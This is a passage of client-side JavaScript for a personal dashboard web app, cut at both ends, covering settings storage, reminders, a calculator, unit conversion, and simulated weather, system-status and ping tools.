                !button.id.startsWith('notificationLogBtn')) { // Exclude primary navigation buttons that already call logButtonPress through togglePanel
                
                if (button.onclick) { // If already has inline onclick
                    const originalOnclick = button.onclick;
                    button.onclick = null; // Clear inline for better management
                    eventManager.addListener(button, 'click', (e) => {
                        this.logButtonPress(e.target);
                        originalOnclick(e); // Execute original logic
                    });
                } else { // Regular button without inline onclick
                    eventManager.addListener(button, 'click', (e) => {
                        this.logButtonPress(e.target);
                    });
                }
            }
        });

        // Also add listeners for direct links in panels that do not call togglePanel directly
        const linksToLog = document.querySelectorAll('.links-list a, .handbook-buttons a, .exploit-buttons a');
        linksToLog.forEach(link => {
            eventManager.addListener(link, 'click', (e) => {
                this.notify(`Link opened: "${link.innerText}"`, 'info', 3000);
                this.logButtonPress(e.target);
            });
        });
      },


      // --- Settings Panel Logic ---
      saveSettings: function() {
        const settings = {
          theme: document.body.classList.contains('light-theme') ? 'light' : 'dark',
          accentColor: document.getElementById('accentColor')?.value || '#ff914d',
          fontStyle: document.getElementById('fontStyle')?.value || '',
          backgroundImage: document.getElementById('backgroundImage')?.value || '',
          notificationsEnabled: document.getElementById('settingNotificationsEnabled')?.checked || true,
          notificationSound: document.getElementById('notificationSound')?.value || 'none',
          showCalendarBox: document.getElementById('toggleCalendarBox')?.checked || true,
          showMotivationBox: document.getElementById('toggleMotivationBox')?.checked || true,
          showUpdatesBox: document.getElementById('toggleUpdatesBox')?.checked || true,
          showSystemAlertsBox: document.getElementById('toggleSystemAlertsBox')?.checked || true,
          aboutMe: document.getElementById('aboutMe')?.value || '',
          defaultReminderSound: document.getElementById('defaultReminderSound')?.value || 'alert1',
          defaultSnoozeTime: document.getElementById('defaultSnoozeTime')?.value || 5,
        };
        localStorage.setItem('dashboardSettings', JSON.stringify(settings));
        this.notify('Settings saved!', 'success');
      },

      loadSettings: function() {
        const savedSettings = JSON.parse(localStorage.getItem('dashboardSettings'));
        if (!savedSettings) return;

        // Apply Theme
        if (savedSettings.theme === 'light') {
            document.body.classList.add('light-theme');
            const themeBtn = document.getElementById('themeToggle');
            if (themeBtn) themeBtn.innerText = '☀️ Light Mode';
            const settingThemeToggle = document.getElementById('settingThemeToggle');
            if (settingThemeToggle) settingThemeToggle.checked = true;
        } else {
            document.body.classList.remove('light-theme');
            const themeBtn = document.getElementById('themeToggle');
            if (themeBtn) themeBtn.innerText = '🌙 Dark Mode';
            const settingThemeToggle = document.getElementById('settingThemeToggle');
            if (settingThemeToggle) settingThemeToggle.checked = false;
        }

        // Apply Accent Color
        document.documentElement.style.setProperty('--dark-accent-primary', savedSettings.accentColor);
        document.getElementById('accentColor').value = savedSettings.accentColor;
        this.updateAccentColorVars();

        // Apply Font Style
        if (savedSettings.fontStyle) {
            document.body.style.fontFamily = savedSettings.fontStyle;
            document.getElementById('fontStyle').value = savedSettings.fontStyle;
        }
        
        // Apply Background Image (Simulated)
        if (savedSettings.backgroundImage && savedSettings.backgroundImage !== 'none') {
            document.body.style.backgroundImage = `url(${savedSettings.backgroundImage})`;
            document.body.style.backgroundSize = 'cover';
            document.body.style.backgroundAttachment = 'fixed';
            document.getElementById('backgroundImage').value = savedSettings.backgroundImage;
        } else if (document.getElementById('backgroundImage')) {
            document.body.style.backgroundImage = '';
            document.getElementById('backgroundImage').value = 'none';
        }

        // Apply Notifications settings
        if (document.getElementById('settingNotificationsEnabled')) document.getElementById('settingNotificationsEnabled').checked = savedSettings.notificationsEnabled;
        if (document.getElementById('notificationSound')) document.getElementById('notificationSound').value = savedSettings.notificationSound;

        // Apply Dashboard Layout settings
        if (document.getElementById('toggleCalendarBox')) document.getElementById('toggleCalendarBox').checked = savedSettings.showCalendarBox;
        if (document.getElementById('toggleMotivationBox')) document.getElementById('toggleMotivationBox').checked = savedSettings.showMotivationBox;
        if (document.getElementById('toggleUpdatesBox')) document.getElementById('toggleUpdatesBox').checked = savedSettings.showUpdatesBox;
        if (document.getElementById('toggleSystemAlertsBox')) document.getElementById('toggleSystemAlertsBox').checked = savedSettings.showSystemAlertsBox;
        this.applyLayoutSettings(false); // Apply layout changes without resaving

        // Apply Account details
        if (document.getElementById('aboutMe')) document.getElementById('aboutMe').value = savedSettings.aboutMe;

        // Apply Reminder System settings
        if (document.getElementById('defaultReminderSound')) document.getElementById('defaultReminderSound').value = savedSettings.defaultReminderSound;
        if (document.getElementById('defaultSnoozeTime')) document.getElementById('defaultSnoozeTime').value = savedSettings.defaultSnoozeTime;
      },

      updateAccentColorVars: function() {
        // Read the currently active primary accent color (from variable or explicit setting)
        let primaryAccent = document.documentElement.style.getPropertyValue('--dark-accent-primary') || getComputedStyle(document.documentElement).getPropertyValue('--dark-accent-primary');

        // Dark theme adjustments (based on selected accent color)
        document.documentElement.style.setProperty('--dark-accent-primary', primaryAccent);
        document.documentElement.style.setProperty('--dark-accent-secondary', this.lightenColor(primaryAccent, 20)); // Generate a lighter shade
        document.documentElement.style.setProperty('--dark-box-h2-color', this.lightenColor(primaryAccent, 30));
        document.documentElement.style.setProperty('--dark-entry-bg', this.darkenColor(primaryAccent, 30, 0.4)); // Darker, less saturated

        // Light theme adjustments (could be independent or based on primary)
        // For now, mirroring primary, but could define completely different for light theme.
        document.documentElement.style.setProperty('--light-accent-primary', primaryAccent);
        document.documentElement.style.setProperty('--light-box-h2-color', this.darkenColor(primaryAccent, 40));
        document.documentElement.style.setProperty('--light-entry-bg', this.lightenColor(primaryAccent, 60)); // Very light accent

      },
      // Helper function to lighten a hex color
      lightenColor: function(hex, percent) {
        const num = parseInt(hex.replace("#",""), 16),
            amt = Math.round(2.55 * percent),
            R = (num >> 16) + amt,
            B = (num >> 8 & 0x00FF) + amt,
            G = (num & 0x0000FF) + amt;
        return "#" + (0x1000000 + (R<255?R<1?0:R:255)*0x10000 + (B<255?B<1?0:B:255)*0x100 + (G<255?G<1?0:G:255)).toString(16).slice(1);
      },
      // Helper function to darken a hex color (and make it a bit desaturated if opacity provided)
      darkenColor: function(hex, percent, opacity=1) {
        const num = parseInt(hex.replace("#",""), 16),
            amt = Math.round(2.55 * percent),
            R = (num >> 16) - amt,
            B = (num >> 8 & 0x00FF) - amt,
            G = (num & 0x0000FF) - amt;

        // Apply desaturation (simple approximation by mixing with grey)
        const newR = Math.round((R<255?R<1?0:R:255) * opacity + (1 - opacity) * 128);
        const newB = Math.round((B<255?B<1?0:B:255) * opacity + (1 - opacity) * 128);
        const newG = Math.round((G<255?G<1?0:G:255) * opacity + (1 - opacity) * 128);

        return "#" + (0x1000000 + newR * 0x10000 + newB * 0x100 + newG).toString(16).slice(1);
      },

      applySetting: function(settingKey) {
          switch (settingKey) {
              case 'accentColor':
                  const newColor = document.getElementById('accentColor').value;
                  document.documentElement.style.setProperty('--dark-accent-primary', newColor);
                  this.updateAccentColorVars(); // Recalculate related colors
                  this.notify(`Accent color changed to ${newColor}`, 'success');
                  break;
              case 'fontStyle':
                  const newFont = document.getElementById('fontStyle').value;
                  document.body.style.fontFamily = newFont;
                  this.notify(`Font style changed to ${newFont}`, 'success');
                  break;
              case 'backgroundImage':
                  const newBg = document.getElementById('backgroundImage').value.trim();
                  if (newBg && newBg !== 'none') {
                      document.body.style.backgroundImage = `url(${newBg})`;
                      document.body.style.backgroundSize = 'cover';
                      document.body.style.backgroundAttachment = 'fixed';
                      this.notify(`Background image set.`, 'success');
                  } else {
                      document.body.style.backgroundImage = 'none';
                      this.notify(`Background image cleared.`, 'success');
                  }
                  break;
              case 'changePassword':
                  const newPw = document.getElementById('changePassword').value;
                  const confirmPw = document.getElementById('confirmPassword').value;
                  if (newPw === '' || confirmPw === '') {
                      this.notify('Password fields cannot be empty.', 'error');
                      return;
                  }
                  if (newPw === confirmPw) {
                      this.notify('Password changed successfully (simulated)!', 'success');
                      document.getElementById('changePassword').value = '';
                      document.getElementById('confirmPassword').value = '';
                  } else {
                      this.notify('Passwords do not match.', 'error');
                  }
                  break;
              case 'aboutMe':
                  const newAboutMe = document.getElementById('aboutMe').value;
                  this.notify('About Me updated.', 'success');
                  break;
              default:
                  break;
          }
          this.saveSettings();
      },

      applyLayoutSettings: function(shouldSave = true) {
        const calendarBox = document.querySelector('#mainGrid .box:nth-child(1)'); // Calendar is first box
        const motivationBox = document.querySelector('#mainGrid .box:nth-child(2)'); // Motivation is second box
        const updatesBox = document.querySelector('#updatesNotifications .box:nth-child(1)');
        const systemAlertsBox = document.querySelector('#updatesNotifications .box:nth-child(2)');

        if (calendarBox && document.getElementById('toggleCalendarBox')) calendarBox.style.display = document.getElementById('toggleCalendarBox').checked ? 'flex' : 'none';
        if (motivationBox && document.getElementById('toggleMotivationBox')) motivationBox.style.display = document.getElementById('toggleMotivationBox').checked ? 'flex' : 'none';
        if (updatesBox && document.getElementById('toggleUpdatesBox')) updatesBox.style.display = document.getElementById('toggleUpdatesBox').checked ? 'flex' : 'none';
        if (systemAlertsBox && document.getElementById('toggleSystemAlertsBox')) systemAlertsBox.style.display = document.getElementById('toggleSystemAlertsBox').checked ? 'flex' : 'none';

        if(shouldSave) {
            this.saveSettings();
            this.notify('Dashboard layout updated.', 'success');
        }
      },

      resetSettings: function() {
          if (confirm('Are you sure you want to reset all dashboard settings to default? This cannot be undone.')) {
              localStorage.removeItem('dashboardSettings');
              location.reload(); // Reload to apply defaults
              this.notify('Settings reset to default.', 'info');
          }
      },


      // --- Reminders System Logic ---
      saveReminders: function() {
        localStorage.setItem('dashboardReminders', JSON.stringify(this.reminders));
      },

      loadReminders: function() {
        const savedReminders = JSON.parse(localStorage.getItem('dashboardReminders'));
        if (savedReminders) {
          this.reminders = savedReminders;
        }
      },

      addReminder: function() {
        const textInput = document.getElementById('reminderText');
        const dateInput = document.getElementById('reminderDate');
        const timeInput = document.getElementById('reminderTime');

        if (!textInput.value || !dateInput.value) {
          this.notify('Reminder text and date are required!', 'error');
          return;
        }

        const reminder = {
          id: Date.now(),
          text: textInput.value,
          date: dateInput.value,
          time: timeInput.value,
          completed: false,
          created: new Date().toISOString()
        };

        this.reminders.push(reminder);
        this.saveReminders();
        this.renderReminders();

        textInput.value = '';
        dateInput.value = '';
        timeInput.value = '';
        this.notify('Reminder added successfully!', 'success');
      },

      renderReminders: function() {
        const reminderList = document.getElementById('reminderList');
        if (!reminderList) return;

        reminderList.innerHTML = '';
        if (this.reminders.length === 0) {
            reminderList.innerHTML = '<p style="text-align: center; color: gray;">No reminders set. Add one above!</p>';
            return;
        }

        // Sort reminders by date and time
        this.reminders.sort((a, b) => {
          const dateA = new Date(`${a.date}T${a.time || '00:00'}`);
          const dateB = new Date(`${b.date}T${b.time || '00:00'}`);
          return dateA - dateB;
        });

        this.reminders.forEach(reminder => {
          const reminderEl = document.createElement('div');
          reminderEl.className = `reminder-entry ${reminder.completed ? 'completed' : ''}`;

          const reminderDateTime = new Date(`${reminder.date}T${reminder.time || '00:00'}`);
          const now = new Date();
          if (!reminder.completed && reminderDateTime < now) {
              reminderEl.classList.add('overdue');
          }


          reminderEl.innerHTML = `
            <span>
              <strong>${reminder.text}</strong><br>
              <small>${reminder.date} ${reminder.time ? `at ${reminder.time}` : ''}</small>
            </span>
            <div class="actions">
              <button class="button" onclick="dashboard.toggleReminderComplete(${reminder.id})">${reminder.completed ? 'Unmark' : 'Complete'}</button>
              <button class="button" style="background-color: darkred; color: white;" onclick="dashboard.deleteReminder(${reminder.id})">Delete</button>
            </div>
          `;
          reminderList.appendChild(reminderEl);
        });
      },

      toggleReminderComplete: function(id) {
        const reminderIndex = this.reminders.findIndex(r => r.id === id);
        if (reminderIndex > -1) {
          this.reminders[reminderIndex].completed = !this.reminders[reminderIndex].completed;
          this.saveReminders();
          this.renderReminders();
          this.notify(`Reminder "${this.reminders[reminderIndex].text}" marked as ${this.reminders[reminderIndex].completed ? 'completed' : 'incomplete'}.`, 'info');
        }
      },

      deleteReminder: function(id) {
        if (confirm('Are you sure you want to delete this reminder?')) {
            this.reminders = this.reminders.filter(r => r.id !== id);
            this.saveReminders();
            this.renderReminders();
            this.notify('Reminder deleted.', 'info');
        }
      },

      checkOverdueReminders: function() {
        // Run every minute
        setInterval(() => {
          const now = new Date();
          this.reminders.forEach(reminder => {
            if (!reminder.completed) {
              const reminderDateTime = new Date(`${reminder.date}T${reminder.time || '00:00'}`);
              if (reminderDateTime < now && (now.getTime() - reminderDateTime.getTime()) < 60000) { // Check if it became overdue in the last minute
                this.notify(`Reminder DUE NOW: ${reminder.text} ${reminder.date} ${reminder.time}`, 'warning', 10000);
              }
            }
          });
          this.renderReminders(); // Refresh status (e.g., add 'overdue' class)
        }, 60000);
      },


      // --- Specific Panel Logic ---

      initSpecificPanelLogics: function() {
        this.initCalculator();
        this.initUnitConverter();
        this.initWeatherSimulation();
        this.initTextEditor();
        this.initPasswordGenerator();
        this.initDiceRoller();
        this.initCoinFlipper();
        this.initRandomNumberGenerator();
        this.initTimerStopwatch();
        this.initSystemStatusSimulation();
        this.initNetworkToolsSimulation();
      },

      // Calculator
      initCalculator: function() {
        const calcDisplay = document.getElementById('calcDisplay');
        const calcGrid = document.querySelector('.calculator-grid');
        if (!calcGrid || !calcDisplay) return;

        let currentInput = '0';
        let previousInput = '';
        let operator = null;
        let waitingForSecondOperand = false;

        const updateDisplay = () => {
          calcDisplay.textContent = currentInput;
        };

        const calculate = (num1, num2, op) => {
            num1 = parseFloat(num1);
            num2 = parseFloat(num2);
            if (isNaN(num1) || isNaN(num2)) return NaN;
            switch (op) {
                case '+': return num1 + num2;
                case '-': return num1 - num2;
                case '*': return num1 * num2;
                case '/': return num1 / num2;
                default: return NaN;
            }
        };

        eventManager.addListener(calcGrid, 'click', (e) => {
            const { calcValue } = e.target.dataset;
            if (!calcValue) return;

            this.notify(`Calculator button: ${calcValue}`, 'info', 1000);

            if (calcValue === 'C') {
                currentInput = '0';
                previousInput = '';
                operator = null;
                waitingForSecondOperand = false;
            } else if (['+', '-', '*', '/'].includes(calcValue)) {
                if (currentInput === 'Error') {
                    currentInput = '0';
                }
                if (!operator || waitingForSecondOperand) {
                    previousInput = currentInput;
                    operator = calcValue;
                    waitingForSecondOperand = true;
                } else if (!waitingForSecondOperand && operator) { // Chaining operations
                    currentInput = String(calculate(previousInput, currentInput, operator));
                    if (currentInput === 'NaN') {
                        currentInput = 'Error';
                        this.notify('Calculator error!', 'error');
                    }
                    previousInput = currentInput;
                    operator = calcValue;
                    waitingForSecondOperand = true;
                }
            } else if (calcValue === '=') {
                if (operator && previousInput) {
                    currentInput = String(calculate(previousInput, currentInput, operator));
                    if (currentInput === 'NaN') {
                        currentInput = 'Error';
                        this.notify('Calculator error!', 'error');
                    }
                    operator = null;
                    previousInput = '';
                    waitingForSecondOperand = false;
                }
            } else if (calcValue === '.') {
                if (waitingForSecondOperand) {
                    currentInput = '0.';
                    waitingForSecondOperand = false;
                } else if (!currentInput.includes('.')) {
                    currentInput += '.';
                }
            } else { // Number input
                if (currentInput === '0' || waitingForSecondOperand || currentInput === 'Error') {
                    currentInput = calcValue;
                    waitingForSecondOperand = false;
                } else {
                    currentInput += calcValue;
                }
            }
            updateDisplay();
        });
        updateDisplay();
      },

      // Unit Converter
      conversionRates: {
        meters: { feet: 3.28084, kilometers: 0.001, miles: 0.000621371 },
        feet: { meters: 0.3048, kilometers: 0.0003048, miles: 0.000189394 },
        kilometers: { meters: 1000, feet: 3280.84, miles: 0.621371 },
        miles: { meters: 1609.34, feet: 5280, kilometers: 1.60934 },
        kilograms: { pounds: 2.20462, ounces: 35.274 },
        pounds: { kilograms: 0.453592, ounces: 16 },
        ounces: { kilograms: 0.0283495, pounds: 0.0625 }
      },
      convertUnits: function() {
        const value = parseFloat(document.getElementById('convertValue').value);
        const fromUnit = document.getElementById('convertFrom').value;
        const toUnit = document.getElementById('convertTo').value;
        const resultEl = document.getElementById('conversionResult');

        if (isNaN(value)) {
            resultEl.textContent = 'Please enter a valid number.';
            this.notify('Invalid value for conversion.', 'error');
            return;
        }
        if (!this.conversionRates[fromUnit] || !this.conversionRates[fromUnit][toUnit]) {
            resultEl.textContent = 'Conversion not supported between these units, or same unit.';
            this.notify('Conversion not supported.', 'error');
            return;
        }

        let result = value;
        // Convert 'from' unit to base unit if necessary (or directly if available)
        // This simple setup assumes direct conversion is available or one-step.
        // For more complex, one would convert to a 'standard' unit first (e.g., meters for length) then to target.
        if (fromUnit === toUnit) {
            result = value;
        } else {
            result = value * this.conversionRates[fromUnit][toUnit];
        }

        resultEl.innerHTML = `<strong>${value} ${fromUnit}</strong> is <strong>${result.toFixed(4)} ${toUnit}</strong>`;
        this.notify(`Converted ${fromUnit} to ${toUnit}`, 'success');
      },

      // Weather Simulation
      initWeatherSimulation: function() {
        eventManager.addListener(document.getElementById('weatherLocation'), 'keypress', (e) => {
            if (e.key === 'Enter') this.getWeather();
        });
      },
      getWeather: function() {
        const location = document.getElementById('weatherLocation').value;
        const weatherDisplay = document.getElementById('weatherDisplay');
        this.notify(`Fetching weather for "${location}" (simulated)...`, 'info');
        
        // Simulate API call and different results
        let tempF, tempC, condition, humidity, wind, forecast;
        const now = new Date();
        const hour = now.getHours();

        const getEmoji = (cond) => {
            if (cond.includes('Sunny')) return '☀️';
            if (cond.includes('Cloudy')) return '☁️';
            if (cond.includes('Rain')) return '🌧️';
            if (cond.includes('Snow')) return '🌨️';
            if (cond.includes('wind')) return '🌬️';
            return '❓';
        };

        if (location.toLowerCase().includes('middletown')) {
            tempF = Math.floor(Math.random() * 20) + 65; // 65-85
            tempC = ((tempF - 32) * 5 / 9).toFixed(0);
            if (hour > 20 || hour < 6) { // Night
                condition = 'Clear with a cool breeze';
                tempF -= 10; tempC = ((tempF - 32) * 5 / 9).toFixed(0);
            } else if (Math.random() < 0.3) {
                condition = 'Partly Cloudy';
            } else if (Math.random() < 0.1) {
                condition = 'Light Rain showers';
            } else {
                condition = 'Sunny with a gentle breeze';
            }
            humidity = Math.floor(Math.random() * 30) + 50; // 50-80
            wind = Math.floor(Math.random() * 10) + 5; // 5-15 mph
            forecast = 'Partly cloudy, high ' + (parseInt(tempF) + 3) + '°F (' + ((parseInt(tempF) + 3 - 32) * 5 / 9).toFixed(0) + '°C)';
        } else if (location.toLowerCase().includes('new york')) {
            tempF = Math.floor(Math.random() * 15) + 70; // 70-85
            tempC = ((tempF - 32) * 5 / 9).toFixed(0);
            condition = 'Mostly Cloudy';
            humidity = 70; wind = 12;
            forecast = 'Chance of rain, high ' + (parseInt(tempF) + 2) + '°F';
        } else if (location.toLowerCase().includes('london')) {
            tempF = Math.floor(Math.random() * 10) + 55; // 55-65
            tempC = ((tempF - 32) * 5 / 9).toFixed(0);
            condition = 'Overcast with light drizzle';
            humidity = 85; wind = 10;
            forecast = 'Rainy, high ' + (parseInt(tempF) - 5) + '°F';
        } else {
            tempF = Math.floor(Math.random() * 40) + 40; // Random generalized weather
            tempC = ((tempF - 32) * 5 / 9).toFixed(0);
            const conditions = ['Sunny', 'Cloudy', 'Rainy', 'Windy', 'Snowy'];
            condition = conditions[Math.floor(Math.random() * conditions.length)];
            humidity = Math.floor(Math.random() * 100);
            wind = Math.floor(Math.random() * 20);
            forecast = `${conditions[Math.floor(Math.random() * conditions.length)]}, high ${parseInt(tempF) + Math.floor(Math.random()*10)-5}°F`;
        }

        setTimeout(() => { // Simulate network delay
            weatherDisplay.innerHTML = `
                <p><strong>Location:</strong> ${location}, ${now.toLocaleDateString()}</p>
                <p><strong>Current Temperature:</strong> ${tempF}°F (${tempC}°C) ${getEmoji(condition)}</p>
                <p><strong>Conditions:</strong> ${condition}</p>
                <p><strong>Humidity:</strong> ${humidity}%</p>
                <p><strong>Wind Speed:</strong> ${wind} mph</p>
                <p><strong>Forecast for Tomorrow:</strong> ${forecast}</p>
            `;
            this.notify(`Weather updated for "${location}".`, 'success');
        }, 1000);
      },

      // Text Editor
      initTextEditor: function() {
        // Simple client-side save/load for text editor
      },
      saveTextToFile: function() {
        const textContent = document.getElementById('textEditor').value;
        if (!textContent) {
            this.notify('Text editor is empty!', 'warning');
            return;
        }
        const blob = new Blob([textContent], { type: 'text/plain' });
        const a = document.createElement('a');
        a.download = 'dashboard_note.txt';
        a.href = URL.createObjectURL(blob);
        a.click();
        URL.revokeObjectURL(a.href);
        this.notify('Text saved to file.', 'success');
      },
      loadTextFromFile: function() {
          const input = document.createElement('input');
          input.type = 'file';
          input.accept = 'text/plain';
          input.onchange = e => {
              const file = e.target.files[0];
              if (file) {
                  const reader = new FileReader();
                  reader.onload = event => {
                      document.getElementById('textEditor').value = event.target.result;
                      this.notify('Text loaded from file.', 'success');
                  };
                  reader.onerror = () => {
                      this.notify('Failed to load text file.', 'error');
                  };
                  reader.readAsText(file);
              }
          };
          input.click();
      },
      clearTextEditor: function() {
          if (confirm('Are you sure you want to clear all text from the editor?')) {
              document.getElementById('textEditor').value = '';
              this.notify('Text editor cleared.', 'info');
          }
      },

      // Password Generator
      initPasswordGenerator: function() {
        const pwLengthSlider = document.getElementById('pwLength');
        const pwLengthDisplay = document.getElementById('pwLengthDisplay');
        if (pwLengthSlider && pwLengthDisplay) {
            eventManager.addListener(pwLengthSlider, 'input', () => {
                pwLengthDisplay.textContent = pwLengthSlider.value;
            });
        }
      },
      generatePassword: function() {
        const length = parseInt(document.getElementById('pwLength').value);
        const includeUppercase = document.getElementById('pwUppercase').checked;
        const includeLowercase = document.getElementById('pwLowercase').checked;
        const includeNumbers = document.getElementById('pwNumbers').checked;
        const includeSymbols = document.getElementById('pwSymbols').checked;

        let chars = '';
        if (includeUppercase) chars += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        if (includeLowercase) chars += 'abcdefghijklmnopqrstuvwxyz';
        if (includeNumbers) chars += '0123456789';
        if (includeSymbols) chars += '!@#$%^&*()_+~`|}{[]:;?><,./-=';

        if (chars.length === 0) {
            document.getElementById('generatedPassword').textContent = 'Select character types!';
            this.notify('No character types selected for password!', 'error');
            return;
        }

        let password = '';
        for (let i = 0; i < length; i++) {
            password += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        document.getElementById('generatedPassword').textContent = password;
        this.notify('New password generated!', 'success');
      },
      copyPassword: function() {
        const passwordField = document.getElementById('generatedPassword');
        const passwordText = passwordField.textContent;
        if (passwordText && passwordText !== 'Click "Generate Password"') {
            navigator.clipboard.writeText(passwordText).then(() => {
                this.notify('Password copied to clipboard!', 'success');
            }).catch(err => {
                this.notify('Failed to copy password.', 'error');
                console.error('Could not copy text: ', err);
            });
        } else {
            this.notify('No password to copy!', 'warning');
        }
      },

      // Dice Roller
      rollDice: function() {
        const numDice = parseInt(document.getElementById('numDice').value);
        const diceType = parseInt(document.getElementById('diceType').value);
        let rolls = [];
        let total = 0;

        if (isNaN(numDice) || numDice < 1 || isNaN(diceType)) {
            this.notify('Invalid number of dice or dice type.', 'error');
            return;
        }

        for (let i = 0; i < numDice; i++) {
            const roll = Math.floor(Math.random() * diceType) + 1;
            rolls.push(roll);
            total += roll;
        }

        document.getElementById('diceResults').textContent = `Rolls: ${rolls.join(', ')}`;
        document.getElementById('diceTotal').textContent = `Total: ${total}`;
        this.notify(`Rolled ${numDice} D${diceType}(s). Total: ${total}`, 'info');
      },

      // Coin Flipper
      flipCoin: function() {
        const result = Math.random() < 0.5 ? 'Heads' : 'Tails';
        document.getElementById('coinResult').textContent = `Result: ${result}!`;
        this.notify(`Coin flipped: ${result}`, 'info');
      },

      // Random Number Generator
      generateRandomNumber: function() {
        const min = parseInt(document.getElementById('minRandom').value);
        const max = parseInt(document.getElementById('maxRandom').value);

        if (isNaN(min) || isNaN(max) || min > max) {
            document.getElementById('randomNumberResult').textContent = 'Invalid Range!';
            this.notify('Invalid range for random number generator.', 'error');
            return;
        }

        const randomNumber = Math.floor(Math.random() * (max - min + 1)) + min;
        document.getElementById('randomNumberResult').textContent = randomNumber;
        this.notify(`Generated random number: ${randomNumber}`, 'success');
      },

      // Timer & Stopwatch
      formatTimeDuration: function(totalSeconds) {
          const hrs = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
          const secs = String(totalSeconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
      },

      startTimer: function() {
          if (this.currentTimer) return; // Prevent multiple timers

          const hours = parseInt(document.getElementById('timerHours').value || 0);
          const minutes = parseInt(document.getElementById('timerMinutes').value || 0);
          const seconds = parseInt(document.getElementById('timerSeconds').value || 0);
          const totalSeconds = (hours * 3600) + (minutes * 60) + seconds;

          if (totalSeconds <= 0) {
              this.notify('Please set a valid timer duration!', 'error');
              return;
          }

          this.timerSecondsLeft = totalSeconds;
          this.notify('Timer started!', 'info');

          this.currentTimer = setInterval(() => {
              if (this.timerSecondsLeft <= 0) {
                  clearInterval(this.currentTimer);
                  this.currentTimer = null;
                  document.getElementById('timerDisplay').textContent = "00:00:00";
                  this.notify('TIMER FINISHED!', 'warning');
                  return;
              }
              document.getElementById('timerDisplay').textContent = this.formatTimeDuration(this.timerSecondsLeft);
              this.timerSecondsLeft--;
          }, 1000);
      },
      pauseTimer: function() {
          if (this.currentTimer) {
              clearInterval(this.currentTimer);
              this.currentTimer = null;
              this.notify('Timer paused.', 'info');
          }
      },
      resetTimer: function() {
          this.pauseTimer();
          this.timerSecondsLeft = 0;
          document.getElementById('timerDisplay').textContent = "00:00:00";
          document.getElementById('timerHours').value = '0';
          document.getElementById('timerMinutes').value = '0';
          document.getElementById('timerSeconds').value = '0';
          this.notify('Timer reset.', 'info');
      },

      startStopwatch: function() {
          if (this.stopwatchInterval) return;

          this.notify('Stopwatch started!', 'info');
          this.stopwatchInterval = setInterval(() => {
              this.stopwatchSeconds++;
              document.getElementById('stopwatchDisplay').textContent = this.formatTimeDuration(this.stopwatchSeconds);
          }, 1000);
      },
      pauseStopwatch: function() {
          if (this.stopwatchInterval) {
              clearInterval(this.stopwatchInterval);
              this.stopwatchInterval = null;
              this.notify('Stopwatch paused.', 'info');
          }
      },
      resetStopwatch: function() {
          this.pauseStopwatch();
          this.stopwatchSeconds = 0;
          document.getElementById('stopwatchDisplay').textContent = "00:00:00";
          this.notify('Stopwatch reset.', 'info');
      },

      // Digital Clock Panel
      initDigitalClock: function() {
        const updateDigitalClock = () => {
          const now = new Date();
          const timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }); // 24-hour format
          const dateStr = now.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });

          const digitalClockEl = document.getElementById('digitalClockDisplay');
          if (digitalClockEl) digitalClockEl.textContent = timeStr;
          const digitalDateEl = document.getElementById('digitalDateDisplay');
          if (digitalDateEl) digitalDateEl.textContent = dateStr;
        };
        updateDigitalClock();
        setInterval(updateDigitalClock, 1000);
      },

      // Secret Notes Panel
      clearSecretNotes: function() {
        if (confirm('Are you sure you want to clear your secret notes? This cannot be recovered!')) {
            document.getElementById('secretNotesTextarea').value = '';
            this.notify('Secret notes cleared!', 'warning');
        }
      },
      lockSecretNotes: function() {
          // In a real app, this would encrypt the notes and require a password to decrypt/view.
          // For now, it just clears it for "security by obscurity".
          if (confirm('Are you sure you want to "lock" and clear your notes? (Simulated for security, content is NOT saved.)')) {
              document.getElementById('secretNotesTextarea').value = 'Notes are now locked and hidden. Input removed for security (simulation).';
              this.notify('Secret notes "locked" (content cleared and simulated).', 'success');
          }
      },

      // System Status Simulation
      initSystemStatusSimulation: function() {
        // Initial values and setup
        const sysStatusUptimeEl = document.getElementById('sysStatusUptime');
        let appUptimeSeconds = 0;
        setInterval(() => {
            appUptimeSeconds++;
            const days = Math.floor(appUptimeSeconds / (3600 * 24));
            const hours = Math.floor((appUptimeSeconds % (3600 * 24)) / 3600);
            const minutes = Math.floor((appUptimeSeconds % 3600) / 60);
            if (sysStatusUptimeEl) sysStatusUptimeEl.textContent = `${days} days, ${hours} hours, ${minutes} minutes`;
        }, 1000);

        setInterval(() => {
            document.getElementById('sysStatusLastActivity').textContent = new Date().toLocaleTimeString();
        }, 5000); // Update last activity every 5 seconds
      },
      simulateSystemRefresh: function() {
          const cpu = Math.floor(Math.random() * 20) + 10; // 10-30%
          const memory = (Math.random() * 4 + 3).toFixed(1); // 3.0-7.0 GB
          const disk = Math.floor(Math.random() * 50) + 80; // 80-130 GB free
          const download = (Math.random() * 10 + 5).toFixed(1); // 5-15 Mbps
          const upload = (Math.random() * 5 + 2).toFixed(1); // 2-7 Mbps

          document.getElementById('sysStatusCPU').textContent = `${cpu}%`;
          document.getElementById('sysStatusMemory').textContent = `${memory} GB / 16 GB`;
          document.getElementById('sysStatusDisk').textContent = `${disk} GB Free / 256 GB`;
          document.getElementById('sysStatusNetwork').textContent = `Downloading at ${download} Mbps / Uploading at ${upload} Mbps`;

          const logArea = document.getElementById('systemLogsArea');
          if (logArea) {
            logArea.value += `\n[${new Date().toLocaleTimeString()}] INFO: System stats refreshed. CPU: ${cpu}%`;
            logArea.scrollTop = logArea.scrollHeight; // Scroll to bottom
          }
          this.notify('System status refreshed (simulated).', 'success', 2000);
      },

      // Network Tools Simulation
      initNetworkToolsSimulation: function() {
          eventManager.addListener(document.getElementById('pingTarget'), 'keypress', (e) => {
              if (e.key === 'Enter') this.simulatePing();
          });
          eventManager.addListener(document.getElementById('tracerouteTarget'), 'keypress', (e) => {
              if (e.key === 'Enter') this.simulateTraceroute();
          });
      },
      simulatePing: function() {
        const target = document.getElementById('pingTarget').value;
        const outputEl = document.getElementById('pingOutput');
        if (!target) {
            outputEl.textContent = 'Please enter a target.';
            return;
        }

        this.notify(`Pinging ${target} (simulated)...`, 'info');
        outputEl.textContent = `Pinging ${target}...\n`;
        let pings = [];
        let lost = 0;
        for (let i = 0; i < 4; i++) {
